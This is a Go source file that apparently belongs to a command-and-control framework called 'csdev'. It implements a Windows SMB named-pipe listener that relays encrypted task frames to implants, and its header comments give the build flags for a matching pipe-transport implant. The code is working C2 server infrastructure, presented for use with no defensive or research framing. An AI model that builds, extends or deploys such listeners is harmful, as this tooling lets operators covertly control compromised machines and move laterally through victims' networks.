//go:build windows

// csdev :: smb_listener.go  --  SMB 命名管道 listener (协议 v2 的第三种承载层)
//
// 与 HTTP/TCP 共用 v2ProcessFrame —— 加密、TLV、任务批次完全一致。
// 分帧方式与 TCP 相同: [4B 大端长度][帧字节]。
//
// 实现说明: Go 标准库不含命名管道, 且本项目要求零第三方依赖,
// 因此直接用 kernel32 的 CreateNamedPipeW / ConnectNamedPipe / ReadFile /
// WriteFile (syscall 动态调用)。
//
// 用法: csdev-server.exe --smb \\.\pipe\csdev_pipe
// 植入体: gcc ... -DC2_TRANSPORT_SMB=1 '-DC2_PIPE="\\\\.\\pipe\\csdev_pipe"'
package main

import (
	"crypto/rsa"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

const (
	pipeAccessDuplex   = 0x00000003
	pipeTypeByte       = 0x00000000
	pipeReadmodeByte   = 0x00000000
	pipeWait           = 0x00000000
	pipeUnlimitedInst  = 255
	pipeBufSize        = 65536
	smbMaxFrame        = 8 * 1024 * 1024
	invalidHandleValue = ^uintptr(0)
)

// Win32 错误码 (syscall 未全部导出, 这里显式声明)
const (
	errorBrokenPipe       syscall.Errno = 109 // ERROR_BROKEN_PIPE
	errorPipeNotConnected syscall.Errno = 233 // ERROR_PIPE_NOT_CONNECTED
	errorPipeConnected    syscall.Errno = 535 // ERROR_PIPE_CONNECTED
)

var (
	k32                    = syscall.NewLazyDLL("kernel32.dll")
	procCreateNamedPipeW   = k32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe   = k32.NewProc("ConnectNamedPipe")
	procDisconnectNamed    = k32.NewProc("DisconnectNamedPipe")
	procReadFile           = k32.NewProc("ReadFile")
	procWriteFile          = k32.NewProc("WriteFile")
	procCloseHandle        = k32.NewProc("CloseHandle")
	procFlushFileBuffers   = k32.NewProc("FlushFileBuffers")
)

func createPipeInstance(name string) (syscall.Handle, error) {
	nameW, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	h, _, errno := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(nameW)),
		uintptr(pipeAccessDuplex),
		uintptr(pipeTypeByte|pipeReadmodeByte|pipeWait),
		uintptr(pipeUnlimitedInst),
		uintptr(pipeBufSize),
		uintptr(pipeBufSize),
		0,
		0,
	)
	if h == invalidHandleValue {
		return 0, fmt.Errorf("CreateNamedPipeW 失败: %v", errno)
	}
	return syscall.Handle(h), nil
}

func pipeReadAll(h syscall.Handle, buf []byte) error {
	var done uint32
	n := uintptr(len(buf))
	off := uintptr(0)
	for off < n {
		ok, _, errno := procReadFile.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(&buf[off])),
			n-off,
			uintptr(unsafe.Pointer(&done)),
			0,
		)
		if ok == 0 {
			if errno == errorBrokenPipe || errno == errorPipeNotConnected {
				return fmt.Errorf("管道已关闭")
			}
			return fmt.Errorf("ReadFile 失败: %v", errno)
		}
		if done == 0 {
			return fmt.Errorf("管道 EOF")
		}
		off += uintptr(done)
	}
	return nil
}

func pipeWriteAll(h syscall.Handle, buf []byte) error {
	var done uint32
	n := uintptr(len(buf))
	off := uintptr(0)
	for off < n {
		ok, _, errno := procWriteFile.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(&buf[off])),
			n-off,
			uintptr(unsafe.Pointer(&done)),
			0,
		)
		if ok == 0 {
			return fmt.Errorf("WriteFile 失败: %v", errno)
		}
		if done == 0 {
			return fmt.Errorf("WriteFile 写入 0 字节")
		}
		off += uintptr(done)
	}
	return nil
}

func closeHandle(h syscall.Handle) {
	if h != 0 {
		procCloseHandle.Call(uintptr(h))
	}
}

// ---------------------------------------------------------------- listener

type SMBListener struct {
	Name string
	Pipe string
	Priv *rsa.PrivateKey

	mu    sync.Mutex
	conns int
	stop  chan struct{}
	start time.Time
}

func NewSMBListener(name, pipe string, priv *rsa.PrivateKey) *SMBListener {
	return &SMBListener{Name: name, Pipe: pipe, Priv: priv, stop: make(chan struct{}), start: time.Now()}
}

func (l *SMBListener) Start() error {
	// 先验证能否创建管道实例, 失败则直接报错而不是留一个静默失效的 listener
	h, err := createPipeInstance(l.Pipe)
	if err != nil {
		return err
	}
	closeHandle(h)

	go l.acceptLoop()
	return nil
}

func (l *SMBListener) Stop() {
	select {
	case <-l.stop:
	default:
		close(l.stop)
	}
}

func (l *SMBListener) acceptLoop() {
	for {
		select {
		case <-l.stop:
			return
		default:
		}

		h, err := createPipeInstance(l.Pipe)
		if err != nil {
			logf("[smb] 创建管道实例失败: %v", err)
			time.Sleep(time.Second)
			continue
		}

		// 阻塞等待客户端连接; connected 时返回 0, 已连接时报 ERROR_PIPE_CONNECTED
		ok, _, errno := procConnectNamedPipe.Call(uintptr(h), 0)
		if ok == 0 && errno != errorPipeConnected {
			select {
			case <-l.stop:
				closeHandle(h)
				return
			default:
			}
			closeHandle(h)
			continue
		}

		l.serve(h)
	}
}

func (l *SMBListener) serve(h syscall.Handle) {
	l.mu.Lock()
	l.conns++
	addr := fmt.Sprintf("%s#%d", l.Pipe, l.conns)
	l.mu.Unlock()

	logf("[smb] %s 接入", addr)

	defer func() {
		procFlushFileBuffers.Call(uintptr(h))
		procDisconnectNamed.Call(uintptr(h))
		closeHandle(h)
		logf("[smb] %s 断开", addr)
	}()

	var hdr [4]byte
	for {
		if err := pipeReadAll(h, hdr[:]); err != nil {
			return
		}
		n := binary.BigEndian.Uint32(hdr[:])
		if n == 0 || n > smbMaxFrame {
			logf("[smb] %s 帧长度非法 (%d), 断开", addr, n)
			return
		}
		buf := make([]byte, n)
		if err := pipeReadAll(h, buf); err != nil {
			return
		}

		resp := v2ProcessFrame(buf, addr, l.Priv)
		if resp == nil {
			binary.BigEndian.PutUint32(hdr[:], 0)
			if err := pipeWriteAll(h, hdr[:]); err != nil {
				return
			}
			continue
		}
		if len(resp) > smbMaxFrame {
			logf("[smb] %s 应答过大 (%d), 断开", addr, len(resp))
			return
		}
		binary.BigEndian.PutUint32(hdr[:], uint32(len(resp)))
		if err := pipeWriteAll(h, hdr[:]); err != nil {
			return
		}
		if err := pipeWriteAll(h, resp); err != nil {
			return
		}
	}
}

// ---------------------------------------------------------------- 接线

var gSMBListeners []*SMBListener

// startSMBListener 启动命名管道 listener。
// pipe 形如 `\\.\pipe\csdev_pipe`, 或只给名字 `csdev_pipe` (自动补前缀)。
func startSMBListener(pipe string, priv *rsa.PrivateKey) error {
	pipe = strings.TrimSpace(pipe)
	if pipe == "" {
		return nil
	}
	if !strings.HasPrefix(pipe, `\\.\pipe\`) && !strings.HasPrefix(pipe, `\\?\pipe\`) {
		pipe = `\\.\pipe\` + pipe
	}

	name := "csdev-smb"
	l := NewSMBListener(name, pipe, priv)
	if err := l.Start(); err != nil {
		return err
	}
	gSMBListeners = append(gSMBListeners, l)

	// 注册表登记与事件日志由 listener_add 路径统一完成 (见 listener_admin.go):
	// 参数启动 (--smb) 与 REST (/api/listener/add) 走的是同一条 Add。
	logf("  SMB 入口: %s  (命名管道, 共用 v2 加密与任务协议)", pipe)
	return nil
}

func smbListenerSummary() []map[string]interface{} {
	out := []map[string]interface{}{}
	for _, l := range gSMBListeners {
		l.mu.Lock()
		n := l.conns
		l.mu.Unlock()
		out = append(out, map[string]interface{}{
			"name":      l.Name,
			"pipe":      l.Pipe,
			"conns":     n,
			"uptime_ns": time.Since(l.start).Nanoseconds(),
		})
	}
	return out
}
